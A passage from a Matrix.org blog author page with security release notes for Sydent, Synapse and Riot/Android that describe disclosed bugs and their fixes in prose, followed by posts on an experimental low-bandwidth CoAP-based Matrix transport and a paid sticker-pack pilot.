<li>Mitigate an HTML injection bug where an invalid room_id could result in malicious HTML being injected into validation emails.  <strong>The fix for this is in the email template itself; you will need to update any customised email templates to be protected.</strong>  Thanks to Enguerran Gillier (<a href="https://twitter.com/@opnsec">@opnsec</a>) for identifying and responsibly disclosing this issue too!</li>
<li>Randomise session_ids to avoid leaking info about the total number of identity validations, and whether a given ID has been validated.  Thanks to <a href="https://fs0c131y.com">@fs0c131y</a> for identifying and responsibly disclosing this one.</li>
</ul>
<p>If you are running Sydent as an identity server, you should update as soon as possible from <a href="https://github.com/matrix-org/sydent/releases/v1.0.3">https://github.com/matrix-org/sydent/releases/v1.0.3</a>.  We are not aware of any of these issues having been exploited maliciously in the wild.</p>
<h2 id="synapse-0-99-3-1">Synapse 0.99.3.1</h2>
<p>Synapse 0.99.3.1 is a security update for two fixes:</p>
<ul>
<li>Ensure that random IDs in Synapse are generated using a secure random number generator, ensuring they cannot be predicted by an attacker. Thanks to Enguerran Gillier (<a href="https://twitter.com/@opnsec">@opnsec</a>) for identifying and responsibly disclosing this issue!</li>
<li>Add 0.0.0.0/32 and ::/128 to the URL preview blacklist configuration, ensuring that an attacker cannot make connections to localhost. Thanks to Enguerran Gillier (<a href="https://twitter.com/@opnsec">@opnsec</a>) for identifying and responsibly disclosing this issue too!</li>
</ul>
<p>You can update from <a href="https://github.com/matrix-org/synapse/releases">https://github.com/matrix-org/synapse/releases</a> or similar as normal. We are not aware of any of these issues having been exploited maliciously in the wild.</p>
<p>(Synapse 0.99.3.2 was released shortly afterwards to fix a non-security issue with the Debian packaging)</p>
<h2 id="riot-android-0-9-x-0-8-99-google-play-and-0-8-28a-f-droid">Riot/Android 0.9.x/0.8.99 (Google Play) and 0.8.28a (F-Droid)</h2>
<p>Riot/Android has an important security fix which shipped over the course of the last week in various versions of the app:</p>
<ul>
<li>Remove obsolete and buggy ContentProvider which could allow a malicious local app to compromise account data. Many thanks to Julien Thomas (<a href="https://twitter.com/@julien_thomas">@julien_thomas</a>) from <a href="https://protektoid.com">Protektoid Project</a> for identifying this and responsibly disclosing it!</li>
</ul>
<p>The fix for this shipped on F-Droid since 0.8.28a, and on the Play Store, the fix is present in both v0.9.0 (the first version of the re-published Riot app) and v0.8.99 (the last version of the old Riot app, which told everyone to reinstall).  Other forks of Riot which we’re aware of have also been informed and should be updated.</p>
<p>If you haven’t already updated, please do so now.</p>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;03&#x2F;12&#x2F;breaking-the-100bps-barrier-with-matrix-meshsim-coap-proxy&#x2F;" title="Breaking the 100bps barrier with Matrix, meshsim &amp; coap-proxy">Breaking the 100bps barrier with Matrix, meshsim &amp; coap-proxy</a></h2>
                <span>
                    12.03.2019 00:00
                    —
                    <a href="/category/in-the-news">
                        In the News
                    </a>
                    —
                    <a
                        href="/author/matthew-hodgson">
                        Matthew Hodgson
                    </a>
                </span>
                
            </header>
            <div>
                
                <p>Hi all,</p>
<p>Last month at FOSDEM 2019 we gave a <a href="https://fosdem.org/2019/schedule/event/matrix/">talk</a> about a new experimental ultra-low-bandwidth transport for Matrix which swaps our baseline HTTPS+JSON transport for a custom one built on <a href="https://tools.ietf.org/html/rfc7252">CoAP</a>+<a href="https://tools.ietf.org/html/rfc7049">CBOR</a>+<a href="https://noiseprotocol.org">Noise</a>+<a href="https://golang.org/pkg/compress/flate/">Flate</a>+<a href="https://tools.ietf.org/rfc/rfc768.txt">UDP</a>.  (CoAP is the RPC protocol; CBOR is the encoding; Noise powers the transport layer encryption; Flate compresses everything uses predefined compression maps).</p>
<p>The challenge here was to see if we could demonstrate Matrix working usably over networks running at around 100 bits per second of throughput (where it'd take 2 minutes to send a typical 1500 byte ethernet packet!!) and very high latencies.  You can see the original FOSDEM talk below, or <a href="/blog/wp-content/uploads/2019/02/2019-02-03-FOSDEM-Low-Bandwidth.pdf">check out the slides here.</a></p>
<iframe src="https://www.youtube.com/embed/DZBvy4abB1o" width="1280" height="720" frameBorder="0" allowFullScreen="allowfullscreen"><span data-mce-type="bookmark" style="display: inline-block; width: 0px; overflow: hidden; line-height: 0;" class="mce_SELRES_start">﻿</span></iframe>
<p>Now, it's taken us a little while to find time to tidy up the stuff we demo'd in the talk to be (relatively) suitable for public consumption, but we're happy to finally release the four projects which powered the demo:</p>
<ul>
 	<li><a href="https://github.com/matrix-org/meshsim">https://github.com/matrix-org/meshsim</a> - meshsim is the network simulator which provides an interactive web interface to draw a network topology and let you spin up dockerized homeservers on a simulated network with whatever preferred latency, jitter, packet loss etc.</li>
 	<li><a href="https://github.com/matrix-org/meshsim-docker">https://github.com/matrix-org/meshsim-docker</a> - meshsim-docker is the custom synapse + coap-proxy Dockerfile used to define the containers which meshsim instantiates</li>
 	<li><a href="https://github.com/matrix-org/coap-proxy">https://github.com/matrix-org/coap-proxy</a> - coap-proxy is the golang proxy which converts HTTPS+JSON into CoAP+CBOR+Noise+Flate and vice versa, letting you squish Matrix CS API and SS API traffic in & out of CoAP.</li>
 	<li><a href="https://github.com/matrix-org/go-coap">https://github.com/matrix-org/go-coap</a> - go-coap is a fork of the <a href="https://github.com/Kistler-Group">Kistler-Group</a>'s <a href="https://github.com/go-ocf/go-coap">go-ocf/go-coap</a> (in turn originally a fork of <a href="https://github.com/dustin/go-coap">dustin/go-coap</a>) which adds encryption using <a href="https://noiseprotocol.org">Noise</a>, retries, and hooks for compression.</li>
</ul>
In order to get up and running, the <a href="https://github.com/matrix-org/meshsim/blob/master/README.md">meshsim README</a> has all the details.
<p>It's important to understand that this is very much a proof of concept, and shouldn't be used in production yet, and almost certainly has some glaring bugs.  In fact, it currently assumes you are running on a trusted private network rather than the public Matrix network in order to get away with some of the bandwidth optimisations performed - see <a href="https://github.com/matrix-org/coap-proxy#limitations">coap-proxy's Limitations section</a> for details.  Particularly, please note that the encryption is homemade and not audited or fully reviewed or tested yet.  Also, we've released the code for the low-bandwidth transport, but we haven't released the &quot;fan-out routing&quot; implementation for Synapse as it needs a <a href="https://yggdrasil-network.github.io/">rethink</a> to be applicable to the public Matrix network.  You'll also want to run Riot/Web in <a href="https://github.com/matrix-org/matrix-react-sdk/pull/2598">low-bandwidth mode</a> if you really wind down the bandwidth (suppressing avatars, read receipts, typing notifs and presence to avoid wasting precious bandwidth).</p>
<p>We also don't have an MSC for the CoAP-based transport yet, mainly due to lack of time whilst wanting to ensure the limitations are addressed first before we propose it as a formal alternative Matrix transport.  (We also first need to define negotiation mechanisms for entirely alternative CS &amp; SS transports!).  However, the quick overview is:</p>
<ul>
 	<li>JSON is converted directly into CBOR (with a few substitutions made to shrink common patterns down)</li>
 	<li>HTTP is converted directly into CoAP (mapping the verbose API endpoints down to single-byte endpoints)</li>
 	<li>TLS is swapped out for <a href="https://noiseprotocol.org/noise.html#noise-pipes">Noise Pipes</a> (XX + IK noise handshakes).  This gives us 1RTT setup (XX) for the first connection to a host, and 0RTT (IK) for all subsequent connections, and provides trust-on-first-use semantics when connecting to a server.  You can see the Noise state machine we maintain in go-coap's <a href="https://github.com/matrix-org/go-coap/blob/master/noise.go">noise.go</a>.</li>
 	<li>The CoAP headers are hoisted up above the Noise payload, letting us use them for framing the noise pipes without having duplicated framing headers at the CoAP & Noise layers.  We also <a href="https://github.com/matrix-org/go-coap/blob/e156f6bb5d3c728040ceffd09685610128d3c63c/conn.go#L340-L371">frame the Noise handshake packets as CoAP</a> with custom message types (250, 251 and 252).  We might be better off using <a href="https://github.com/core-wg/oscoap">OSCORE</a> for this, however, rather than hand-wrapping a custom encrypted transport...</li>
 	<li>The CoAP payload is compressed via <a href="https://golang.org/pkg/compress/flate/">Flate</a> using preshared compression tables derived from compressing large chunks of representative Matrix traffic. This could be significantly improved in future with streaming compression and dynamic tables (albeit seeded from a common set of tables).</li>
</ul>
The end result is that you end up taking about 90 bytes (including ethernet headers!) to send a typical Matrix message (and about 70 bytes to receive the acknowledgement).  This breaks down as as:
<ul>
 	<li>14 bytes of Ethernet headers</li>
 	<li>20 bytes of IP headers</li>
 	<li>8 bytes of UDP headers</li>
 	<li>16 bytes of Noise AEAD</li>
 	<li>6 bytes of CoAP headers</li>
 	<li>~26 bytes of compressed and encrypted CBOR</li>
</ul>
The Noise handshake on connection setup would take an additional 128 bytes (4x 32 byte Curve25519 DH values), either spread over 1RTT for initial setup or 0RTT for subsequent setups.
<p>At 100bps, 90 bytes takes 90*8/100 = 7.2s to send... which is just about usable in an extreme life and death situation where you can only get 100bps of connectivity (e.g. someone at the bottom of a ravine trying to trickle data over one bar of GPRS to the emergency services).  In practice, on a custom network, you could ditch the Ethernet and UDP/IP headers if on a point-to-point link for CS API, and ditch the encryption if the network physical layer was trusted - at which point we're talking ~32 bytes per request (2.5s to send at 100bps).  Then, there's still a whole wave of additional work that could be investigated, including...</p>
<ul>
 	<li>Smarter streaming compression (so that if a user says 'Hello?' three times in a row, the 2nd and 3rd messages are just references to the first pattern)</li>
 	<li>Hoisting Matrix transaction IDs up to the CoAP layer (reusing the CoAP msgId+token rather than passing around new Matrix transaction IDs, at the expense of requiring one Matrix txn per request)</li>
 	<li>Switching to CoAP OBSERVE for receiving data from the server (currently we long-poll /sync to receive data)</li>
 	<li>Switching access_tokens for PSKs or similar</li>
</ul>
...all of which could shrink the payload down even further.  That said, even in its current state, it's a massive improvement - roughly ~65x better than the equivalent HTTPS+JSON traffic.
<p>In practice, <strong>further work on low-bandwidth Matrix is dependent on finding a sponsor who's willing to fund the team to focus on this</strong>, as otherwise it's hard to justify spending time here in addition to all the less exotic business-as-usual Matrix work that we need to keep the core of Matrix evolving (finishing 1.0, finishing E2E encryption, speeding up Synapse, finishing Dendrite, rewriting Riot/Android etc).  However, the benefits here should be pretty obvious: massively reduced bandwidth and battery-life; resilience to catastrophic network conditions; faster sync times; and even a protocol suitable for push notifications (Matrix as e2e encrypted, decentralised, push!).  If you're interested in supporting this work, please contact <code>support at matrix.org</code>.</p>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;03&#x2F;07&#x2F;experiments-with-payments-over-matrix&#x2F;" title="Experiments with payments over Matrix">Experiments with payments over Matrix</a></h2>
                <span>
                    07.03.2019 00:00
                    —
                    <a href="/category/in-the-news">
                        In the News
                    </a>
                    —
                    <a
                        href="/author/matthew-hodgson">
                        Matthew Hodgson
                    </a>
                </span>
                
            </header>
            <div>
                
                <p>Hi all,</p>
<p>Heads up that<a href="https://modular.im"> Modular.im</a> (the paid hosting Matrix service provided by <a href="https://vector.im">New Vector</a>, the company who employs much of the Matrix core team) launched a pilot today for paid Matrix integrations in the form of paid sticker packs.  Yes kids, it's true - for only $0.50 you can slap Matrix and Riot hex stickers all over your chatrooms. It's a toy example to test the payments infrastructure and demonstrate the concept - the proceeds go towards funding development work on Matrix.org :)  
You can read more about over on <a href="https://www.modular.im/stickers">Modular's blog</a>.</p>
<p>We wanted to elaborate on this a bit from the Matrix.org perspective, specifically:</p>
<ul>
 	<li style="font-weight: 400;">We are categorically <strong>not</strong> baking payments or financial incentives as a first class citizen into Matrix, and we're not going to start moving stuff behind paywalls or similar.
</li>
 	<li style="font-weight: 400;">This demo is a proof-of-concept to illustrate how folks could do this sort of thing in general in Matrix - it's not a serious product in and of itself.
</li>
 	<li style="font-weight: 400;">What it shows is that an Integration Manager like Modular can be used as a way to charge for services in Matrix - whether that's digital content within an integration, or bots/bridges/etc. 
</li>
 	<li style="font-weight: 400;">While Modular today gathers payments via credit-card (Stripe), it could certainly support other mechanisms (e.g. cryptocurrencies) in future.
</li>
 	<li style="font-weight: 400;">The idea in future is for Modular to provide this as a mechanism that <em>anyone</em> can use to charge for content on Matrix - e.g. if you have your own sticker pack and want to sell it to people, you'll be able to upload it and charge people for it.
</li>
</ul>
Meanwhile, there's a lot of interesting stuff on the horizon with integration managers in general - see <a href="https://github.com/matrix-org/matrix-doc/issues/1236">MSC1236</a> and an upcoming MSC from TravisR (based around <a href="https://github.com/matrix-org/matrix-doc/issues/1286">https://github.com/matrix-org/matrix-doc/issues/1286</a>) proposing new integration capabilities.  We're also hoping to implement inline widgets soon (e.g. chatbot buttons for voting and other semantic behaviour) which should make widgets even more interesting!
<p>So, feel free to go stick some hex stickers on your rooms if you like and help test this out.  In future there should be more useful things available :)</p>

                
            </div>
        </article>
        
        <nav class="pagination">
    <div class="prev">
        
        <a href="&#x2F;author&#x2F;matthew-hodgson&#x2F;page&#x2F;4&#x2F;">‹ Previous</a>
        
    </div>
    <span class="page-number">5 / 15</span>
    <div class="prev">
        
        <a href="&#x2F;author&#x2F;matthew-hodgson&#x2F;page&#x2F;6&#x2F;">Next ›</a>
        
    </div>
</nav>

    </div>
</div>

    </main>

    <footer class="site-footer">
    <div class="internal-links">
        
        <a href="&#x2F;faq">FAQs</a>
        
        <a href="&#x2F;security-disclosure-policy">Security Disclosure Policy</a>
        
        <a href="&#x2F;security-hall-of-fame">Security Hall of Fame</a>
        
        <a href="&#x2F;legal&#x2F;code-of-conduct">Code of Conduct for Matrix.org</a>
        
        <a href="&#x2F;legal">Legal</a>
        
        <a href="&#x2F;contact">Contact</a>
        
        <a href="https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;">Site Source</a>
        
    </div>
    <div class="external-links">
        <div>
            
            <a href="&#x2F;code"><img src="/assets/github.svg" alt="GitHub"></a>
            
            <a href="https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;"><img src="/assets/gitlab.svg" alt="GitLab"></a>
            
            <a href="https:&#x2F;&#x2F;mastodon.matrix.org&#x2F;@matrix"><img src="/assets/mastodon.svg" alt="Mastodon"></a>
            
            <a href="https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg"><img src="/assets/twitter.svg" alt="Twitter"></a>
            
            <a href="https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UCVFkW-chclhuyYRbmmfwt6w"><img src="/assets/youtube.svg" alt="YouTube"></a>
            
        </div>
    </div>
    <p>© 2022 The Matrix.org Foundation C.I.C.</p>
</footer>

</body>

</html>
